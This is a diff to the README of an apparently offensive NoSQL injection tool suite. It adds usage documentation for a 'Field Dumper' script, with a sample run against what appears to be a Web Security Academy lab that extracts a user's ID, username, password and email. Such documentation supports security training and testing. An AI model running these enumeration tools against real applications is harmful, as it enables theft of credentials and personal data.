@@ -1,6 +1,64 @@
 # NoSQLI-Attack-Suite
 These scripts enumerate usernames and passwords from web applications vulnerable to NoSQL injection in MongoDB databases
 
+## NoSQLI Field Dumper
+
+### Help panel
+
+```
+# python NoSQLI-Field-Dumper.py -h                                                                                                      
+usage: NoSQLI-Field-Dumper.py [-h] -u  [-p ] [-o ]
+
+MongoDB Fields Enumeration via NoSQL Injection
+
+options:
+  -h, --help     Show this help message and exit
+  -u, --url      Target URL (e.g. https://example.com/login)
+  -p, --proxy    Proxy URL (e.g. http://127.0.0.1:8080)
+  -o, --output   Output file (default: fields.txt)
+```
+
+### Usage
+
+```
+# python NoSQLI-Field-Dumper.py -u https://0a01002d04aceb0a8189481100bf00aa.web-security-academy.net/login                              
+[+] Enumerating number of fields: Completed
+[+] Fields found: 4
+
+[+] Enumerating field lengths: Completed
+[+] Field 0: 3
+[+] Field 1: 8
+[+] Field 2: 8
+[+] Field 3: 5
+
+[+] Enumerating field names: Completed
+[+] Field 0: _id
+[+] Field 1: username
+[+] Field 2: password
+[+] Field 3: email
+
+[?] Enter field indexes to dump (0-3, comma-separated) or 'all' for all fields: all
+
+[+] Enumerating field value lengths: Completed
+[+] Field 0: 24
+[+] Field 1: 6
+[+] Field 2: 20
+[+] Field 3: 22
+
+[+] Enumerating field values: Completed
+[+] Field 0: 69274af055ca7f15ff6bccc7
+[+] Field 1: wiener
+[+] Field 2: 06ryo7x8fg6acramlazq
+[+] Field 3: wiener@normal-user.net
+
+[*] Fields and values
+[*] _id:69274af055ca7f15ff6bccc7
+[*] username:wiener
+[*] password:06ryo7x8fg6acramlazq
+[*] email:wiener@normal-user.net
+[*] Results saved to fields.txt
+```
+
 ## NoSQLI User Enumerator
 
 ### Help panel
